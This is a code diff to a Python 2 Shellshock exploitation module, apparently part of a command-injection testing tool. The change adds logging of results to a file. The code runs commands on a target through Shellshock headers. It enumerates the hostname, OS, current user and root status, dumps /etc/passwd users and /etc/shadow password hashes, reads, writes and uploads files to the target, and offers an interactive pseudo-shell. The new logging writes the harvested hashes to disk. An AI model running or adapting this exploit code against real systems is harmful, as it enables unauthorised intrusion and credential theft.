@@ -59,7 +59,7 @@ def shellshock_exploitation(cve, cmd):
 """
 Enumeration Options
 """
-def enumeration(url, cve, check_header):
+def enumeration(url, cve, check_header, filename):
 
   print ""
   #-------------------------------
@@ -67,38 +67,15 @@ def enumeration(url, cve, check_header):
   #-------------------------------
   if menu.options.hostname:
     cmd = settings.HOSTNAME
-    shell = cmd_exec(url, cmd, cve, check_header)
+    shell = cmd_exec(url, cmd, cve, check_header, filename)
     if menu.options.verbose:
       print ""
     sys.stdout.write(Style.BRIGHT + "(!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".\n")
     sys.stdout.flush()
-    settings.ENUMERATION_DONE = True
-
-  #-------------------------------
-  # The current user enumeration
-  #-------------------------------
-  if menu.options.current_user:
-    cmd = settings.CURRENT_USER
-    cu_account = cmd_exec(url, cmd, cve, check_header)
-    if cu_account:
-      if menu.options.is_root:
-        cmd = settings.ISROOT
-        shell = cmd_exec(url, cmd, cve, check_header)
-        if menu.options.verbose:
-          print ""
-        sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
-        if shell:
-          if shell != "0":
-              sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "not" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n")
-              sys.stdout.flush()
-          else:
-            sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n")
-            sys.stdout.flush()
-      else:
-        if menu.options.verbose:
-          print ""
-        sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".\n")
-        sys.stdout.flush()
+    # Add infos to logs file. 
+    output_file = open(filename, "a")
+    output_file.write("    (!) The hostname is " + shell + ".\n")
+    output_file.close()
     settings.ENUMERATION_DONE = True
 
   #-------------------------------
@@ -106,21 +83,73 @@ def enumeration(url, cve, check_header):
   #-------------------------------
   if menu.options.sys_info:
     cmd = settings.RECOGNISE_OS            
-    target_os = cmd_exec(url, cmd, cve, check_header)
+    target_os = cmd_exec(url, cmd, cve, check_header, filename)
     if target_os == "Linux":
       cmd = settings.RECOGNISE_HP
-      target_arch = cmd_exec(url, cmd, cve, check_header)
+      target_arch = cmd_exec(url, cmd, cve, check_header, filename)
       if target_arch:
         if menu.options.verbose:
           print ""
         sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
         sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n")
         sys.stdout.flush()
+        # Add infos to logs file.   
+        output_file = open(filename, "a")
+        output_file.write("    (!) The target operating system is " + target_os)
+        output_file.write(" and the hardware platform is " + target_arch + ".\n")
+        output_file.close()
     else:
       if menu.options.verbose:
         print ""
       sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL + ".\n")
       sys.stdout.flush()
+      # Add infos to logs file.    
+      output_file = open(filename, "a")
+      output_file.write("    (!) The target operating system is " + target_os + ".\n")
+      output_file.close()
+    settings.ENUMERATION_DONE = True
+
+  #-------------------------------
+  # The current user enumeration
+  #-------------------------------
+  if menu.options.current_user:
+    cmd = settings.CURRENT_USER
+    cu_account = cmd_exec(url, cmd, cve, check_header, filename)
+    if cu_account:
+      if menu.options.is_root:
+        cmd = settings.ISROOT
+        shell = cmd_exec(url, cmd, cve, check_header, filename)
+        if menu.options.verbose:
+          print ""
+        sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
+        # Add infos to logs file.    
+        output_file = open(filename, "a")
+        output_file.write("    (!) The current user is " + cu_account)
+        output_file.close()
+        if shell:
+          if shell != "0":
+              sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "not" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n")
+              sys.stdout.flush()
+              # Add infos to logs file.   
+              output_file = open(filename, "a")
+              output_file.write(" and it is not privilleged.\n")
+              output_file.close()
+          else:
+            sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n")
+            sys.stdout.flush()
+            # Add infos to logs file.   
+            output_file = open(filename, "a")
+            output_file.write(" and it is privilleged.\n")
+            output_file.close()
+      else:
+        if menu.options.verbose:
+          print ""
+        sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".\n")
+        sys.stdout.flush()
+        # Add infos to logs file.   
+        output_file = open(filename, "a")
+        output_file.write("    (!) The current user is " + cu_account + "\n")
+        output_file.close()  
     settings.ENUMERATION_DONE = True
 
   #-------------------------------
@@ -128,7 +157,7 @@ def enumeration(url, cve, check_header):
   #-------------------------------
   if menu.options.users:
     cmd = settings.SYS_USERS             
-    sys_users = cmd_exec(url, cmd, cve, check_header)
+    sys_users = cmd_exec(url, cmd, cve, check_header, filename)
     if sys_users :
       sys_users = "".join(str(p) for p in sys_users)
       sys_users = sys_users.replace("(@)", "\n")
@@ -141,6 +170,10 @@ def enumeration(url, cve, check_header):
         sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
         sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users)) + " entries in '" + settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
         sys.stdout.flush()
+        # Add infos to logs file.   
+        output_file = open(filename, "a")
+        output_file.write("    (!) Identified " + str(len(sys_users)) + " entries in '" + settings.PASSWD_FILE + "'.\n")
+        output_file.close()
         count = 0
         for line in sys_users:
           count = count + 1
@@ -149,20 +182,29 @@ def enumeration(url, cve, check_header):
           if menu.options.privileges:
             if int(fields[1]) == 0:
               is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
+              is_privilleged_nh = " is root user "
             elif int(fields[1]) > 0 and int(fields[1]) < 99 :
               is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
+              is_privilleged_nh = " is system user "
             elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
               if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
                 is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
+                is_privilleged_nh = " is anonymous user "
               elif int(fields[1]) == 60002:
                 is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
+                is_privilleged_nh = " is non-trusted user "   
               else:
                 is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
+                is_privilleged_nh = " is regular user "
             else :
               is_privilleged = ""
           else :
-            is_privilleged = ""
+              is_privilleged = ""
           print "  ("+str(count)+") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privilleged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
+          # Add infos to logs file.   
+          output_file = open(filename, "a")
+          output_file.write("      ("+str(count)+") '" + fields[0]+ "'" + is_privilleged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
+          output_file.close()
       else:
         print "\n" + Fore.YELLOW + "(^) Warning: Cannot open '" + settings.PASSWD_FILE + "'." + Style.RESET_ALL
     settings.ENUMERATION_DONE = True
@@ -172,7 +214,7 @@ def enumeration(url, cve, check_header):
     #-------------------------------------
     if menu.options.passwords:
       cmd = settings.SYS_PASSES            
-      sys_passes = cmd_exec(url, cmd, cve, check_header)
+      sys_passes = cmd_exec(url, cmd, cve, check_header, filename)
       if sys_passes :
         sys_passes = "".join(str(p) for p in sys_passes)
         sys_passes = sys_passes.replace("(@)", "\n")
@@ -183,20 +225,31 @@ def enumeration(url, cve, check_header):
           sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
           sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
           sys.stdout.flush()
+          # Add infos to logs file.   
+          output_file = open(filename, "a")
+          output_file.write("    (!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" )
+          output_file.close()
           count = 0
           for line in sys_passes:
             count = count + 1
             fields = line.split(":")
             if fields[1] != "*" and fields[1] != "!!" and fields[1] != "":
               print "  ("+str(count)+") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
+              # Add infos to logs file.   
+              output_file = open(filename, "a")
+              output_file.write("      ("+str(count)+") " + fields[0] + " : " + fields[1])
+              output_file.close()
         else:
           print "\n" + Fore.YELLOW + "(^) Warning: Cannot open '" + settings.SHADOW_FILE + "'." + Style.RESET_ALL
       settings.ENUMERATION_DONE = True  
 
+  if settings.ENUMERATION_DONE == True:
+    print ""
+
 """
 File Access Options
 """
-def file_access(url, cve, check_header):
+def file_access(url, cve, check_header, filename):
 
   #-------------------------------------
   # Read a file from the target host.
@@ -205,7 +258,7 @@ def file_access(url, cve, check_header):
     file_to_read = menu.options.file_read
     # Execute command
     cmd = "cat " + settings.FILE_READ + file_to_read
-    shell = cmd_exec(url, cmd, cve, check_header)
+    shell = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
       if menu.options.verbose:
         print ""
@@ -248,12 +301,12 @@ def file_access(url, cve, check_header):
       
     # Execute command
     cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
-    shell = cmd_exec(url, cmd, cve, check_header)
+    shell = cmd_exec(url, cmd, cve, check_header, filename)
     
     # Check if file exists!
     cmd = "ls " + dest_to_write + ""
     # Check if defined cookie injection.
-    shell = cmd_exec(url, cmd, cve, check_header)
+    shell = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
       if menu.options.verbose:
         print ""
@@ -288,12 +341,12 @@ def file_access(url, cve, check_header):
       
     # Execute command
     cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
-    shell = cmd_exec(url, cmd, cve, check_header)
+    shell = cmd_exec(url, cmd, cve, check_header, filename)
     shell = "".join(str(p) for p in shell)
     
     # Check if file exists!
     cmd = "ls " + dest_to_upload
-    shell = cmd_exec(url, cmd, cve, check_header)
+    shell = cmd_exec(url, cmd, cve, check_header, filename)
     shell = "".join(str(p) for p in shell)
     if shell:
       if menu.options.verbose:
@@ -304,6 +357,10 @@ def file_access(url, cve, check_header):
      sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL)
      sys.stdout.flush()
     settings.FILE_ACCESS_DONE = True
+
+  if settings.FILE_ACCESS_DONE == True:
+    print ""
+
 
 """
 The main shellshock handler
@@ -361,7 +418,7 @@ def shellshock_handler(url, http_request_method, filename):
           if vp_flag == True:
             vuln_parameter = "HTTP Header"
             vp_flag = logs.add_parameter(vp_flag, filename, check_header, vuln_parameter, payload)
-          logs.upload_payload(filename, counter, payload) 
+          logs.update_payload(filename, counter, payload) 
 
         if cve in response.info():
           no_result = False
@@ -376,8 +433,7 @@ def shellshock_handler(url, http_request_method, filename):
             while True:
               enumerate_again = raw_input("(?) Do you want to enumerate again? [Y/n/q] > ").lower()
               if enumerate_again in settings.CHOISE_YES:
-                enumeration(url, cve, check_header)
-                print ""
+                enumeration(url, cve, check_header, filename)
                 break
               elif enumerate_again in settings.CHOISE_NO: 
                 break
@@ -389,14 +445,14 @@ def shellshock_handler(url, http_request_method, filename):
                 print Back.RED + "(x) Error: '" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL
                 pass
           else:
-            enumeration(url, cve, check_header)
+            enumeration(url, cve, check_header, filename)
 
           # File access options.
           if settings.FILE_ACCESS_DONE == True :
             while True:
               file_access_again = raw_input("(?) Do you want to access files again? [Y/n/q] > ").lower()
               if file_access_again in settings.CHOISE_YES:
-                file_access(url, cve, check_header)
+                file_access(url, cve, check_header, filename)
                 break
               elif file_access_again in settings.CHOISE_NO: 
                 break
@@ -408,12 +464,11 @@ def shellshock_handler(url, http_request_method, filename):
                 print Back.RED + "(x) Error: '" + file_access_again  + "' is not a valid answer." + Style.RESET_ALL
                 pass
           else:
-            file_access(url, cve, check_header)
-            print ""
+            file_access(url, cve, check_header, filename)
 
           if menu.options.os_cmd:
             cmd = menu.options.os_cmd 
-            shell = cmd_exec(url, cmd, cve, check_header)
+            shell = cmd_exec(url, cmd, cve, check_header, filename)
             print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n" 
             sys.exit(0)
 
@@ -423,8 +478,8 @@ def shellshock_handler(url, http_request_method, filename):
             while True:
               if go_back == True:
                 break
-              # if settings.ENUMERATION_DONE == False or settings.FILE_ACCESS_DONE == False :
-              #   print ""
+              if settings.ENUMERATION_DONE == False and settings.FILE_ACCESS_DONE == False:
+               	print ""
               gotshell = raw_input("(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
               if gotshell in settings.CHOISE_YES:
                 print ""
@@ -450,7 +505,7 @@ def shellshock_handler(url, http_request_method, filename):
                         pass
 
                     else: 
-                      shell = cmd_exec(url, cmd, cve, check_header)
+                      shell = cmd_exec(url, cmd, cve, check_header, filename)
                       print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n" 
                       
                   except KeyboardInterrupt:
@@ -491,12 +546,12 @@ def shellshock_handler(url, http_request_method, filename):
 """
 Execute user commands
 """
-def cmd_exec(url, cmd, cve, check_header):
+def cmd_exec(url, cmd, cve, check_header, filename):
 
   """
   Check for shellshock 'shell'
   """
-  def check_for_shell(url, cmd, cve, check_header):
+  def check_for_shell(url, cmd, cve, check_header, filename):
     try:
       payload = shellshock_exploitation(cve, cmd)
 
@@ -514,13 +569,13 @@ def cmd_exec(url, cmd, cve, check_header):
       print "\n" + Fore.YELLOW + "(^) Warning: " + str(err) + Style.RESET_ALL
       sys.exit(0)
 
-  shell = check_for_shell(url, cmd, cve, check_header)
+  shell = check_for_shell(url, cmd, cve, check_header, filename)
   if len(shell) == 0:
     cmd = "/bin/" + cmd
-    shell = check_for_shell(url, cmd, cve, check_header)
+    shell = check_for_shell(url, cmd, cve, check_header, filename)
     if len(shell) == 0:
       cmd = "/usr" + cmd
-      shell = check_for_shell(url, cmd, cve, check_header)
+      shell = check_for_shell(url, cmd, cve, check_header, filename)
 
   return shell
 
